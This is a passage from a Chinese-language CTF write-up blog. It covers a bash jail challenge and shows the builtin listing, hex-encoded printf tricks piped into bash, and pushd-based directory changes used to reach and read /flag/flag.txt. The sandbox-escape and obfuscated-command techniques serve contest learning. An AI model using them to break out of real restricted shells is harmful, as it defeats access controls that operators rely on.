</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>enable</span> <span class=p>[</span><span class=o>-</span><span class=n>a</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>dnps</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>f</span> <span class=n>filename</span><span class=p>]</span> <span class=p>[</span><span class=n>na</span><span class=o>&gt;</span>  <span class=n>times</span>
</span></span><span class=line><span class=cl> <span class=n>eval</span> <span class=p>[</span><span class=n>arg</span> <span class=o>...</span><span class=p>]</span>                          <span class=n>trap</span> <span class=p>[</span><span class=o>-</span><span class=n>lp</span><span class=p>]</span> <span class=p>[[</span><span class=n>arg</span><span class=p>]</span> <span class=n>signal_spec</span> <span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=n>exec</span> <span class=p>[</span><span class=o>-</span><span class=n>cl</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>a</span> <span class=n>name</span><span class=p>]</span> <span class=p>[</span><span class=n>command</span> <span class=p>[</span><span class=n>argume</span><span class=o>&gt;</span>  <span class=bp>true</span>
</span></span><span class=line><span class=cl> <span class=n>exit</span> <span class=p>[</span><span class=n>n</span><span class=p>]</span>                               <span class=o>*</span><span class=n>type</span> <span class=p>[</span><span class=o>-</span><span class=n>afptP</span><span class=p>]</span> <span class=n>name</span> <span class=p>[</span><span class=n>name</span> <span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=k>export</span> <span class=p>[</span><span class=o>-</span><span class=n>fn</span><span class=p>]</span> <span class=p>[</span><span class=n>name</span><span class=p>[</span><span class=o>=</span><span class=n>value</span><span class=p>]</span> <span class=o>...</span><span class=p>]</span> <span class=ow>or</span> <span class=n>ex</span><span class=o>&gt;</span>  <span class=n>typeset</span> <span class=p>[</span><span class=o>-</span><span class=n>aAfFgiIlnrtux</span><span class=p>]</span> <span class=n>name</span><span class=p>[</span><span class=o>=</span><span class=n>value</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=bp>false</span>                                   <span class=n>ulimit</span> <span class=p>[</span><span class=o>-</span><span class=n>SHabcdefiklmnpqrstuvxPRT</span><span class=p>]</span> <span class=p>[</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=n>fc</span> <span class=p>[</span><span class=o>-</span><span class=n>e</span> <span class=n>ename</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>lnr</span><span class=p>]</span> <span class=p>[</span><span class=n>first</span><span class=p>]</span> <span class=p>[</span><span class=n>last</span><span class=p>]</span> <span class=n>o</span><span class=o>&gt;</span>  <span class=n>umask</span> <span class=p>[</span><span class=o>-</span><span class=n>p</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>S</span><span class=p>]</span> <span class=p>[</span><span class=n>mode</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=n>fg</span> <span class=p>[</span><span class=n>job_spec</span><span class=p>]</span>                           <span class=n>unalias</span> <span class=p>[</span><span class=o>-</span><span class=n>a</span><span class=p>]</span> <span class=n>name</span> <span class=p>[</span><span class=n>name</span> <span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=k>for</span> <span class=n>NAME</span> <span class=p>[</span><span class=ow>in</span> <span class=n>WORDS</span> <span class=o>...</span> <span class=p>]</span> <span class=p>;</span> <span class=k>do</span> <span class=n>COMMAND</span><span class=o>&gt;</span>  <span class=n>unset</span> <span class=p>[</span><span class=o>-</span><span class=n>f</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>v</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>n</span><span class=p>]</span> <span class=p>[</span><span class=n>name</span> <span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl> <span class=k>for</span> <span class=p>((</span> <span class=n>exp1</span><span class=p>;</span> <span class=n>exp2</span><span class=p>;</span> <span class=n>exp3</span> <span class=p>));</span> <span class=k>do</span> <span class=n>COMMAN</span><span class=o>&gt;</span>  <span class=n>until</span> <span class=n>COMMANDS</span><span class=p>;</span> <span class=k>do</span> <span class=n>COMMANDS</span><span class=o>-</span><span class=mi>2</span><span class=p>;</span> <span class=n>done</span>
</span></span><span class=line><span class=cl> <span class=n>function</span> <span class=n>name</span> <span class=p>{</span> <span class=n>COMMANDS</span> <span class=p>;</span> <span class=p>}</span> <span class=ow>or</span> <span class=n>name</span> <span class=o>&gt;</span>  <span class=n>variables</span> <span class=o>-</span> <span class=n>Names</span> <span class=ow>and</span> <span class=n>meanings</span> <span class=n>of</span> <span class=n>so</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl> <span class=n>getopts</span> <span class=n>optstring</span> <span class=n>name</span> <span class=p>[</span><span class=n>arg</span> <span class=o>...</span><span class=p>]</span>        <span class=n>wait</span> <span class=p>[</span><span class=o>-</span><span class=n>fn</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>p</span> <span class=k>var</span><span class=p>]</span> <span class=p>[</span><span class=n>id</span> <span class=o>...</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=nb>hash</span> <span class=p>[</span><span class=o>-</span><span class=n>lr</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>p</span> <span class=n>pathname</span><span class=p>]</span> <span class=p>[</span><span class=o>-</span><span class=n>dt</span><span class=p>]</span> <span class=p>[</span><span class=n>name</span> <span class=o>&gt;</span>  <span class=k>while</span> <span class=n>COMMANDS</span><span class=p>;</span> <span class=k>do</span> <span class=n>COMMANDS</span><span class=o>-</span><span class=mi>2</span><span class=p>;</span> <span class=n>done</span>
</span></span><span class=line><span class=cl> <span class=n>help</span> <span class=p>[</span><span class=o>-</span><span class=n>dms</span><span class=p>]</span> <span class=p>[</span><span class=n>pattern</span> <span class=o>...</span><span class=p>]</span>               <span class=p>{</span> <span class=n>COMMANDS</span> <span class=p>;</span> <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>那么我们可以使用<code>printf</code>来打印<code>/</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>printf &#34;\\x2f&#34;
</span></span><span class=line><span class=cl>builtin printf &#34;\\x2e\\x2e\\x2fbin&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{printf,&#34;\x73\x6f\x75\x72\x63\x65\x20\x2f\x66\x6c\x61\x67&#34;}|bash
</span></span></code></pre></td></tr></table></div></div><p>没能做出来，后面去问的discord的师傅，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pushd ..
</span></span><span class=line><span class=cl>pushd bin
</span></span><span class=line><span class=cl>bash
</span></span><span class=line><span class=cl>cd /flag
</span></span><span class=line><span class=cl>cat flag.txt
</span></span></code></pre></td></tr></table></div></div><p>先利用<code>pushd</code>切换目录，然后进入<code>/bin</code>之后去开启新的bash会话</p><p>或者是不开启bash会话，其中比较重要的就是<strong>如何切换目录</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>pushd ..
</span></span><span class=line><span class=cl>echo *
</span></span><span class=line><span class=cl>pushd flag
</span></span><span class=line><span class=cl>source flag.txt
</span></span></code></pre></td></tr></table></div></div><h2 id=小结>小结</h2><p>挺好的比赛，每题都让我学到一些东西，密码的两题除外，AI做的，哈哈</p></section><footer class=article-footer><section class=article-tags><a href=/tags/xss/>Xss</a>
<a href=/tags/jail/>Jail</a>
<a href=/tags/jwt/>Jwt</a>
<a href=/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/>日志分析</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>